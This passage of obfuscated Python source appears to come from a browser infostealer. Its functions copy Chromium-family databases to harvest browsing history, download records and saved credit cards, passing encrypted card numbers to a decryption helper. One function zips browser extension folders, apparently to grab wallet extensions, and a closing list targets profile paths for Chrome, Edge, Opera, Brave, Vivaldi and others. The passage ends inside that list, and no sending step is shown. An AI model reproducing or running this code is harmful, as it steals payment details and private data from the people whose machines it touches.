        global MGQZGSYOCFJWGMRFEPKARHHUCLVPKLEYZZZKCAXRZLVWRJRVZGKPSMOUJAFHANUZHOIDXYQKKVOEIMBHTGQIOLWWOPCYDYYJQSKM
        HHCBABHNIXJZUECDLUGURFAHDJPDSIZQROSDURGRDHXRJQJZTCSFTNOEEBKZCNR = os.path.join(RPOOCICOJSINOBOAKSXYOFAXOUBRXLCGPOQTRBSGTBMBIUXFBWWYCUNFEKUGYKGYPIHFZBASSBCSAFWEVMIXITLZDYGEOXS, 'History')
        if not os.path.exists(HHCBABHNIXJZUECDLUGURFAHDJPDSIZQROSDURGRDHXRJQJZTCSFTNOEEBKZCNR):
            return
        
        AYKRAVAFOVSZWCSWATWCZUHFBTDCHHWBVIDCZVGJDJNOHLPRHIYKSKJTSBEVWGEDHAZOZQFVWCXDETCWFW = sqlite3.connect(":memory:")
        WBVHADIMCZVKVSCUZBIGZICQHJNJEMECIFWLBJYCCKLIETNFPGFGPWRLATFVEPFHZZCAXEOPBOHAVMUKJ = sqlite3.connect(HHCBABHNIXJZUECDLUGURFAHDJPDSIZQROSDURGRDHXRJQJZTCSFTNOEEBKZCNR)
        WBVHADIMCZVKVSCUZBIGZICQHJNJEMECIFWLBJYCCKLIETNFPGFGPWRLATFVEPFHZZCAXEOPBOHAVMUKJ.backup(AYKRAVAFOVSZWCSWATWCZUHFBTDCHHWBVIDCZVGJDJNOHLPRHIYKSKJTSBEVWGEDHAZOZQFVWCXDETCWFW)
        WBVHADIMCZVKVSCUZBIGZICQHJNJEMECIFWLBJYCCKLIETNFPGFGPWRLATFVEPFHZZCAXEOPBOHAVMUKJ.close()
        RQGTTCYMFRFUFXGWVPIOJCGHEJWTAOLOLMOMKREBOZDPBVHLQHHTQYXVZMIIPFNHOZRVAAXVSLHCUTUQCMQNLEMPBOX = AYKRAVAFOVSZWCSWATWCZUHFBTDCHHWBVIDCZVGJDJNOHLPRHIYKSKJTSBEVWGEDHAZOZQFVWCXDETCWFW.cursor()
        RQGTTCYMFRFUFXGWVPIOJCGHEJWTAOLOLMOMKREBOZDPBVHLQHHTQYXVZMIIPFNHOZRVAAXVSLHCUTUQCMQNLEMPBOX.execute('SELECT url, title, last_visit_time FROM urls')

        for v4r_row in RQGTTCYMFRFUFXGWVPIOJCGHEJWTAOLOLMOMKREBOZDPBVHLQHHTQYXVZMIIPFNHOZRVAAXVSLHCUTUQCMQNLEMPBOX.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            VWMHCITLQNYVAOEYEBWKTXHXRSMHIIVKZZVLSTYGRYAUZZSLOUEBGMGHXHRZUZJ =          f"- Url     : {v4r_row[0]}"
            LQOHHMAEXJDVQWZFNQCNMYTZMAQAVMVDTPYTTIFZUCZCSSESGUVQ =        f"  Title   : {v4r_row[1]}"
            DAMWEBCTWPTSJIVLKIADNOOXCSQDKLPASTBPKYVIFSWSYFGIWDHWPDCYFETITDTYAAXMYOPBOVRVDTFRPTUOJH =         f"  Time    : {v4r_row[2]}"
            ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA_name = f"  Browser : {ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA}"
            SUSAZYQOINBPOGNYFWLKTTITFXXDYTYHQSQYAZADPWLWMTKXVHERPVTPO.append(f"{VWMHCITLQNYVAOEYEBWKTXHXRSMHIIVKZZVLSTYGRYAUZZSLOUEBGMGHXHRZUZJ}\n{LQOHHMAEXJDVQWZFNQCNMYTZMAQAVMVDTPYTTIFZUCZCSSESGUVQ}\n{DAMWEBCTWPTSJIVLKIADNOOXCSQDKLPASTBPKYVIFSWSYFGIWDHWPDCYFETITDTYAAXMYOPBOVRVDTFRPTUOJH}\n{ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA_name}\n")
            MGQZGSYOCFJWGMRFEPKARHHUCLVPKLEYZZZKCAXRZLVWRJRVZGKPSMOUJAFHANUZHOIDXYQKKVOEIMBHTGQIOLWWOPCYDYYJQSKM += 1

        AYKRAVAFOVSZWCSWATWCZUHFBTDCHHWBVIDCZVGJDJNOHLPRHIYKSKJTSBEVWGEDHAZOZQFVWCXDETCWFW.close()
    
    def PJOKKZTWDAIRMTZZBBAXSEEYJOBVQFDXRLBPYVIYAYOWAPHONKHDUYUPZSCIRJHCU(ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA, RPOOCICOJSINOBOAKSXYOFAXOUBRXLCGPOQTRBSGTBMBIUXFBWWYCUNFEKUGYKGYPIHFZBASSBCSAFWEVMIXITLZDYGEOXS):
        global KCHISRMRZLGZUXKGQLTZCKFMFMZJRHHCGXSREIGJEEEUBMAUBXKDLLDZJLLJLSKOFKKDZVDODDGBRTTOEUHIWLQT
        ASLWWWFNDUJSMXIYODZMMZUISPUBILQKOBDYSBLUKGVYKBKAKNLAUVFZQDXXSIT = os.path.join(RPOOCICOJSINOBOAKSXYOFAXOUBRXLCGPOQTRBSGTBMBIUXFBWWYCUNFEKUGYKGYPIHFZBASSBCSAFWEVMIXITLZDYGEOXS, 'History')
        if not os.path.exists(ASLWWWFNDUJSMXIYODZMMZUISPUBILQKOBDYSBLUKGVYKBKAKNLAUVFZQDXXSIT):
            return

        AYKRAVAFOVSZWCSWATWCZUHFBTDCHHWBVIDCZVGJDJNOHLPRHIYKSKJTSBEVWGEDHAZOZQFVWCXDETCWFW = sqlite3.connect(":memory:")
        WBVHADIMCZVKVSCUZBIGZICQHJNJEMECIFWLBJYCCKLIETNFPGFGPWRLATFVEPFHZZCAXEOPBOHAVMUKJ = sqlite3.connect(ASLWWWFNDUJSMXIYODZMMZUISPUBILQKOBDYSBLUKGVYKBKAKNLAUVFZQDXXSIT)
        WBVHADIMCZVKVSCUZBIGZICQHJNJEMECIFWLBJYCCKLIETNFPGFGPWRLATFVEPFHZZCAXEOPBOHAVMUKJ.backup(AYKRAVAFOVSZWCSWATWCZUHFBTDCHHWBVIDCZVGJDJNOHLPRHIYKSKJTSBEVWGEDHAZOZQFVWCXDETCWFW)
        WBVHADIMCZVKVSCUZBIGZICQHJNJEMECIFWLBJYCCKLIETNFPGFGPWRLATFVEPFHZZCAXEOPBOHAVMUKJ.close()
        RQGTTCYMFRFUFXGWVPIOJCGHEJWTAOLOLMOMKREBOZDPBVHLQHHTQYXVZMIIPFNHOZRVAAXVSLHCUTUQCMQNLEMPBOX = AYKRAVAFOVSZWCSWATWCZUHFBTDCHHWBVIDCZVGJDJNOHLPRHIYKSKJTSBEVWGEDHAZOZQFVWCXDETCWFW.cursor()
        RQGTTCYMFRFUFXGWVPIOJCGHEJWTAOLOLMOMKREBOZDPBVHLQHHTQYXVZMIIPFNHOZRVAAXVSLHCUTUQCMQNLEMPBOX.execute('SELECT tab_url, target_path FROM downloads')
        for row in RQGTTCYMFRFUFXGWVPIOJCGHEJWTAOLOLMOMKREBOZDPBVHLQHHTQYXVZMIIPFNHOZRVAAXVSLHCUTUQCMQNLEMPBOX.fetchall():
            if not row[0] or not row[1]:
                continue
            LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL =         f"- Path    : {row[1]}"
            VWMHCITLQNYVAOEYEBWKTXHXRSMHIIVKZZVLSTYGRYAUZZSLOUEBGMGHXHRZUZJ =          f"  Url     : {row[0]}"
            ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA_name = f"  Browser : {ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA}"
            WTNAAOGQMEASFKRXLTOGGBLMLXJJYSWYNQGEVKCAUXDNHGGSZUSQWDOUCONQWBBBRQOPHBAXRDXAJRYULNSUGURMWIBQITWDZX.append(f"{LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL}\n{VWMHCITLQNYVAOEYEBWKTXHXRSMHIIVKZZVLSTYGRYAUZZSLOUEBGMGHXHRZUZJ}\n{ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA_name}\n")
            KCHISRMRZLGZUXKGQLTZCKFMFMZJRHHCGXSREIGJEEEUBMAUBXKDLLDZJLLJLSKOFKKDZVDODDGBRTTOEUHIWLQT += 1

        AYKRAVAFOVSZWCSWATWCZUHFBTDCHHWBVIDCZVGJDJNOHLPRHIYKSKJTSBEVWGEDHAZOZQFVWCXDETCWFW.close()
    
    def SQWFRJSUODLCMVICZGPLKFUFBXMWNELBHMKMCDKJATYHXQADXEHWCTFZCKEAJRKBGAXFQ(ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA, RPOOCICOJSINOBOAKSXYOFAXOUBRXLCGPOQTRBSGTBMBIUXFBWWYCUNFEKUGYKGYPIHFZBASSBCSAFWEVMIXITLZDYGEOXS, SYOTYMKULEJQDFMYXTAIBXTRCFGZCLUWNHHAGUTJQDQSDSCTYIKFVDZIBSPNETWZWFTXNNRQFKRTYEEFNMAUJYSAAJG):
        global UPICLMNZOKXZJWYGDKKRFSERVKNDCTKHDRNXTMLZHQTNMMMYKRZLD
        WCADWEJSUMYLEQJVVUXOJLCTVWUKICDXIDYOPIMKWOFIPBAOLFNHCFUBMRBRFAIGWVFXYLVLYGQCPHGETEB = os.path.join(RPOOCICOJSINOBOAKSXYOFAXOUBRXLCGPOQTRBSGTBMBIUXFBWWYCUNFEKUGYKGYPIHFZBASSBCSAFWEVMIXITLZDYGEOXS, 'Web Data')
        if not os.path.exists(WCADWEJSUMYLEQJVVUXOJLCTVWUKICDXIDYOPIMKWOFIPBAOLFNHCFUBMRBRFAIGWVFXYLVLYGQCPHGETEB):
            return

        AYKRAVAFOVSZWCSWATWCZUHFBTDCHHWBVIDCZVGJDJNOHLPRHIYKSKJTSBEVWGEDHAZOZQFVWCXDETCWFW = sqlite3.connect(":memory:")
        WBVHADIMCZVKVSCUZBIGZICQHJNJEMECIFWLBJYCCKLIETNFPGFGPWRLATFVEPFHZZCAXEOPBOHAVMUKJ = sqlite3.connect(WCADWEJSUMYLEQJVVUXOJLCTVWUKICDXIDYOPIMKWOFIPBAOLFNHCFUBMRBRFAIGWVFXYLVLYGQCPHGETEB)
        WBVHADIMCZVKVSCUZBIGZICQHJNJEMECIFWLBJYCCKLIETNFPGFGPWRLATFVEPFHZZCAXEOPBOHAVMUKJ.backup(AYKRAVAFOVSZWCSWATWCZUHFBTDCHHWBVIDCZVGJDJNOHLPRHIYKSKJTSBEVWGEDHAZOZQFVWCXDETCWFW)
        WBVHADIMCZVKVSCUZBIGZICQHJNJEMECIFWLBJYCCKLIETNFPGFGPWRLATFVEPFHZZCAXEOPBOHAVMUKJ.close()
        RQGTTCYMFRFUFXGWVPIOJCGHEJWTAOLOLMOMKREBOZDPBVHLQHHTQYXVZMIIPFNHOZRVAAXVSLHCUTUQCMQNLEMPBOX = AYKRAVAFOVSZWCSWATWCZUHFBTDCHHWBVIDCZVGJDJNOHLPRHIYKSKJTSBEVWGEDHAZOZQFVWCXDETCWFW.cursor()
        RQGTTCYMFRFUFXGWVPIOJCGHEJWTAOLOLMOMKREBOZDPBVHLQHHTQYXVZMIIPFNHOZRVAAXVSLHCUTUQCMQNLEMPBOX.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')

        for v4r_row in RQGTTCYMFRFUFXGWVPIOJCGHEJWTAOLOLMOMKREBOZDPBVHLQHHTQYXVZMIIPFNHOZRVAAXVSLHCUTUQCMQNLEMPBOX.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB =             f"- Name             : {v4r_row[0]}"
            ICGAEJTHPRGVGCWHWEMHZNBEVLAYYTNZSZGVWWDJJWFELBLIZUTYSIEHTECZBQDZDQWSNZ = f"  Expiration Month : {v4r_row[1]}"
            WZDFYRUUBIGBNDBHUQCBHCQQSUGUUWEAHYIUEDMWUYMSHFFLZZLUORBIZOCXUFAADKNZKTMNUNUH =  f"  Expiration Year  : {v4r_row[2]}"
            CAKHQKCAHHPMFJMGUOKFIVKCYYDCLQISEZBZOBTVDIZEGCIIWUMBCPKKTZLRTBJLXKJLINSVBNNTIDYHBVMP =      f"  Card Number      : {VOCDSHTBSNYGSKYEWUZBQUZHANBWPXSKNQOAFQKYENXJPVWKYVPKOUJHUAEMXNRPTOEJXSDMPSXYEFQMEWVA(v4r_row[3], SYOTYMKULEJQDFMYXTAIBXTRCFGZCLUWNHHAGUTJQDQSDSCTYIKFVDZIBSPNETWZWFTXNNRQFKRTYEEFNMAUJYSAAJG)}"
            AISTXDKBXYDAYKRACZTQFXPUGCTEDBEDAOAMAKPQSFRPGQDRPPDLUUYMNPBRQZBBD =    f"  Date Modified    : {v4r_row[4]}"
            ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA_name =     f"  Browser          : {ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA}"
            TMTIRXJTEBSJCQTLKXXOBOMFLZFYOSSTGCHVZKLQJMFITHYIZRTMQSZJYWGRMTPXRTLSQYTSTBEGMKX.append(f"{MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB}\n{ICGAEJTHPRGVGCWHWEMHZNBEVLAYYTNZSZGVWWDJJWFELBLIZUTYSIEHTECZBQDZDQWSNZ}\n{WZDFYRUUBIGBNDBHUQCBHCQQSUGUUWEAHYIUEDMWUYMSHFFLZZLUORBIZOCXUFAADKNZKTMNUNUH}\n{CAKHQKCAHHPMFJMGUOKFIVKCYYDCLQISEZBZOBTVDIZEGCIIWUMBCPKKTZLRTBJLXKJLINSVBNNTIDYHBVMP}\n{AISTXDKBXYDAYKRACZTQFXPUGCTEDBEDAOAMAKPQSFRPGQDRPPDLUUYMNPBRQZBBD}\n{ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA_name}\n")
            UPICLMNZOKXZJWYGDKKRFSERVKNDCTKHDRNXTMLZHQTNMMMYKRZLD += 1
        
        AYKRAVAFOVSZWCSWATWCZUHFBTDCHHWBVIDCZVGJDJNOHLPRHIYKSKJTSBEVWGEDHAZOZQFVWCXDETCWFW.close()

    def AVXOGSZPSWLESMOOQPIIDONVHJKLPLKDMAACGEAAREFDDYHWQTPWPCYQKQKKSBSWAATTZSBOWFHQMBPQZZRCANZXKIDPWXPID(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT, UNIDCENPNJMPAFIWZDKZNCFSMFWVDLBUFKSABECJSITQTTWIRJTKBI, ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA, RPOOCICOJSINOBOAKSXYOFAXOUBRXLCGPOQTRBSGTBMBIUXFBWWYCUNFEKUGYKGYPIHFZBASSBCSAFWEVMIXITLZDYGEOXS):
        global YGIBLHTDRVQNOCHHJQRJEYIYXRPUMFUHJEJLDCLNFTIDJENPCUHLFBMIDE
        VAJZPQMGPIEIRKRRAHDSFIHOAWLAAFRPBNHEUZRODKHOFCHHVYMHYSXALZZFBGXHVIIMAKFXZULNCECYLXLTO = os.path.join(RPOOCICOJSINOBOAKSXYOFAXOUBRXLCGPOQTRBSGTBMBIUXFBWWYCUNFEKUGYKGYPIHFZBASSBCSAFWEVMIXITLZDYGEOXS, 'Extensions')
        YMCEKUSXCRAUZHHDBCIBYBDZRVELTVFPYYYQYIGOKXDBWOTBNCYNUKFTKWZEAGOGVAMPNFEBHLPEPHKMYDWGKDIDJQGOXUXU = os.path.join("Extensions", ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA)

        if not os.path.exists(VAJZPQMGPIEIRKRRAHDSFIHOAWLAAFRPBNHEUZRODKHOFCHHVYMHYSXALZZFBGXHVIIMAKFXZULNCECYLXLTO):
            return 

        TFSDMGXCNAIBANQMRUSELNIJVMJZQNLZPWMCVBFSAPFVNNXNJHIJXWHSLUOHOZJYW = [v4r_item for v4r_item in os.listdir(VAJZPQMGPIEIRKRRAHDSFIHOAWLAAFRPBNHEUZRODKHOFCHHVYMHYSXALZZFBGXHVIIMAKFXZULNCECYLXLTO) if os.path.isdir(os.path.join(VAJZPQMGPIEIRKRRAHDSFIHOAWLAAFRPBNHEUZRODKHOFCHHVYMHYSXALZZFBGXHVIIMAKFXZULNCECYLXLTO, v4r_item))]
        
        for BLBQOAHHMNMSUDWOGAMRPUZKXFJHSSBTGFXLPSTHEKKJEDABQEBFXVQDPBEWQBLVBWZHVFETDYTAQPVPCBIPCAIention in TFSDMGXCNAIBANQMRUSELNIJVMJZQNLZPWMCVBFSAPFVNNXNJHIJXWHSLUOHOZJYW:
            if "Temp" in BLBQOAHHMNMSUDWOGAMRPUZKXFJHSSBTGFXLPSTHEKKJEDABQEBFXVQDPBEWQBLVBWZHVFETDYTAQPVPCBIPCAIention:
                continue
            
            YGIBLHTDRVQNOCHHJQRJEYIYXRPUMFUHJEJLDCLNFTIDJENPCUHLFBMIDE += 1
            AHNJPUGMAURVQVCDDUAPTJREXXXHNNQEDGIYIWUDMGLFXWXTNJGGWPKDTLUFTSYSDCDUZJQSNLRWAMQ = False
            
            for BLBQOAHHMNMSUDWOGAMRPUZKXFJHSSBTGFXLPSTHEKKJEDABQEBFXVQDPBEWQBLVBWZHVFETDYTAQPVPCBIPCAIension_name, BLBQOAHHMNMSUDWOGAMRPUZKXFJHSSBTGFXLPSTHEKKJEDABQEBFXVQDPBEWQBLVBWZHVFETDYTAQPVPCBIPCAIension_folder in UNIDCENPNJMPAFIWZDKZNCFSMFWVDLBUFKSABECJSITQTTWIRJTKBI:
                if BLBQOAHHMNMSUDWOGAMRPUZKXFJHSSBTGFXLPSTHEKKJEDABQEBFXVQDPBEWQBLVBWZHVFETDYTAQPVPCBIPCAIention == BLBQOAHHMNMSUDWOGAMRPUZKXFJHSSBTGFXLPSTHEKKJEDABQEBFXVQDPBEWQBLVBWZHVFETDYTAQPVPCBIPCAIension_folder:
                    AHNJPUGMAURVQVCDDUAPTJREXXXHNNQEDGIYIWUDMGLFXWXTNJGGWPKDTLUFTSYSDCDUZJQSNLRWAMQ = True
                    
                    FVMBKTMYWRZANLWUPVCVJFZWPZGSUQZPZPVOBMVMKRJJPOOEXNZCIUPHBYYBWYVEFJOKWZDKNOCDXZPQALR = os.path.join(YMCEKUSXCRAUZHHDBCIBYBDZRVELTVFPYYYQYIGOKXDBWOTBNCYNUKFTKWZEAGOGVAMPNFEBHLPEPHKMYDWGKDIDJQGOXUXU, BLBQOAHHMNMSUDWOGAMRPUZKXFJHSSBTGFXLPSTHEKKJEDABQEBFXVQDPBEWQBLVBWZHVFETDYTAQPVPCBIPCAIension_name, BLBQOAHHMNMSUDWOGAMRPUZKXFJHSSBTGFXLPSTHEKKJEDABQEBFXVQDPBEWQBLVBWZHVFETDYTAQPVPCBIPCAIention)
                    
                    UMKOWZZAGNCRSLAYKSQQPBYMSSJPNVGRNXWMBHNELTMVRGFATXQBAMERMIJBXH = os.path.join(VAJZPQMGPIEIRKRRAHDSFIHOAWLAAFRPBNHEUZRODKHOFCHHVYMHYSXALZZFBGXHVIIMAKFXZULNCECYLXLTO, BLBQOAHHMNMSUDWOGAMRPUZKXFJHSSBTGFXLPSTHEKKJEDABQEBFXVQDPBEWQBLVBWZHVFETDYTAQPVPCBIPCAIention)
                    for v4r_item in os.listdir(UMKOWZZAGNCRSLAYKSQQPBYMSSJPNVGRNXWMBHNELTMVRGFATXQBAMERMIJBXH):
                        SFLRGADSNIZPEABTDTZSFVOWKUMDFSOCKPAPWMKQUXQPECFWRSJMWHJOUNJRVOOXNCCOPNPG = os.path.join(UMKOWZZAGNCRSLAYKSQQPBYMSSJPNVGRNXWMBHNELTMVRGFATXQBAMERMIJBXH, v4r_item)
                        
                        if os.path.isdir(SFLRGADSNIZPEABTDTZSFVOWKUMDFSOCKPAPWMKQUXQPECFWRSJMWHJOUNJRVOOXNCCOPNPG):
                            for dirpath, dirnames, filenames in os.walk(SFLRGADSNIZPEABTDTZSFVOWKUMDFSOCKPAPWMKQUXQPECFWRSJMWHJOUNJRVOOXNCCOPNPG):
                                for filename in filenames:
                                    file_path = os.path.join(dirpath, filename)
                                    arcname = os.path.relpath(file_path, UMKOWZZAGNCRSLAYKSQQPBYMSSJPNVGRNXWMBHNELTMVRGFATXQBAMERMIJBXH)
                                    TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT.write(file_path, os.path.join(FVMBKTMYWRZANLWUPVCVJFZWPZGSUQZPZPVOBMVMKRJJPOOEXNZCIUPHBYYBWYVEFJOKWZDKNOCDXZPQALR, arcname))
                        else:
                            TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT.write(SFLRGADSNIZPEABTDTZSFVOWKUMDFSOCKPAPWMKQUXQPECFWRSJMWHJOUNJRVOOXNCCOPNPG, os.path.join(FVMBKTMYWRZANLWUPVCVJFZWPZGSUQZPZPVOBMVMKRJJPOOEXNZCIUPHBYYBWYVEFJOKWZDKNOCDXZPQALR, v4r_item))
                    break

            if not AHNJPUGMAURVQVCDDUAPTJREXXXHNNQEDGIYIWUDMGLFXWXTNJGGWPKDTLUFTSYSDCDUZJQSNLRWAMQ:
                XDHGMFBFHGMSBUUCPQQHWOZGODSSJLZCXLYPWPXKQOUKOBUQUVAWZZNJPLQATPOXAKKAFTPFNGGJTRNGDDABYQZCLAUJEGEIVOV = os.path.join(YMCEKUSXCRAUZHHDBCIBYBDZRVELTVFPYYYQYIGOKXDBWOTBNCYNUKFTKWZEAGOGVAMPNFEBHLPEPHKMYDWGKDIDJQGOXUXU, "Unknown Extension", BLBQOAHHMNMSUDWOGAMRPUZKXFJHSSBTGFXLPSTHEKKJEDABQEBFXVQDPBEWQBLVBWZHVFETDYTAQPVPCBIPCAIention)
                
                UMKOWZZAGNCRSLAYKSQQPBYMSSJPNVGRNXWMBHNELTMVRGFATXQBAMERMIJBXH = os.path.join(VAJZPQMGPIEIRKRRAHDSFIHOAWLAAFRPBNHEUZRODKHOFCHHVYMHYSXALZZFBGXHVIIMAKFXZULNCECYLXLTO, BLBQOAHHMNMSUDWOGAMRPUZKXFJHSSBTGFXLPSTHEKKJEDABQEBFXVQDPBEWQBLVBWZHVFETDYTAQPVPCBIPCAIention)
                for v4r_item in os.listdir(UMKOWZZAGNCRSLAYKSQQPBYMSSJPNVGRNXWMBHNELTMVRGFATXQBAMERMIJBXH):
                    SFLRGADSNIZPEABTDTZSFVOWKUMDFSOCKPAPWMKQUXQPECFWRSJMWHJOUNJRVOOXNCCOPNPG = os.path.join(UMKOWZZAGNCRSLAYKSQQPBYMSSJPNVGRNXWMBHNELTMVRGFATXQBAMERMIJBXH, v4r_item)
                    
                    if os.path.isdir(SFLRGADSNIZPEABTDTZSFVOWKUMDFSOCKPAPWMKQUXQPECFWRSJMWHJOUNJRVOOXNCCOPNPG):
                        for dirpath, dirnames, filenames in os.walk(SFLRGADSNIZPEABTDTZSFVOWKUMDFSOCKPAPWMKQUXQPECFWRSJMWHJOUNJRVOOXNCCOPNPG):
                            for filename in filenames:
                                file_path = os.path.join(dirpath, filename)
                                arcname = os.path.relpath(file_path, UMKOWZZAGNCRSLAYKSQQPBYMSSJPNVGRNXWMBHNELTMVRGFATXQBAMERMIJBXH)
                                TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT.write(file_path, os.path.join(XDHGMFBFHGMSBUUCPQQHWOZGODSSJLZCXLYPWPXKQOUKOBUQUVAWZZNJPLQATPOXAKKAFTPFNGGJTRNGDDABYQZCLAUJEGEIVOV, arcname))
                    else:
                        TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT.write(SFLRGADSNIZPEABTDTZSFVOWKUMDFSOCKPAPWMKQUXQPECFWRSJMWHJOUNJRVOOXNCCOPNPG, os.path.join(XDHGMFBFHGMSBUUCPQQHWOZGODSSJLZCXLYPWPXKQOUKOBUQUVAWZZNJPLQATPOXAKKAFTPFNGGJTRNGDDABYQZCLAUJEGEIVOV, v4r_item))

    ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA_files = [
        ("Google Chrome",          os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Google", "Chrome", "User Data"),                 "chrome.exe"),
        ("Google Chrome SxS",      os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Google", "Chrome SxS", "User Data"),             "chrome.exe"),
        ("Google Chrome Beta",     os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Google", "Chrome Beta", "User Data"),            "chrome.exe"),
        ("Google Chrome Dev",      os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Google", "Chrome Dev", "User Data"),             "chrome.exe"),
        ("Google Chrome Unstable", os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Google", "Chrome Unstable", "User Data"),        "chrome.exe"),
        ("Google Chrome Canary",   os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Google", "Chrome Canary", "User Data"),          "chrome.exe"),
        ("Microsoft Edge",         os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Microsoft", "Edge", "User Data"),                "msedge.exe"),
        ("Opera",                  os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL, "Opera Software", "Opera Stable"),                "opera.exe"),
        ("Opera GX",               os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL, "Opera Software", "Opera GX Stable"),             "opera.exe"),
        ("Opera Neon",             os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL, "Opera Software", "Opera Neon"),                  "opera.exe"),
        ("Brave",                  os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "BraveSoftware", "Brave-Browser", "User Data"),   "brave.exe"),
        ("Vivaldi",                os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Vivaldi", "User Data"),                          "vivaldi.exe"),
        ("Internet Explorer",      os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Microsoft", "Internet Explorer"),                "iexplore.exe"),
        ("Amigo",                  os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Amigo", "User Data"),                            "amigo.exe"),
        ("Torch",                  os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Torch", "User Data"),                            "torch.exe"),
        ("Kometa",                 os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Kometa", "User Data"),                           "kometa.exe"),
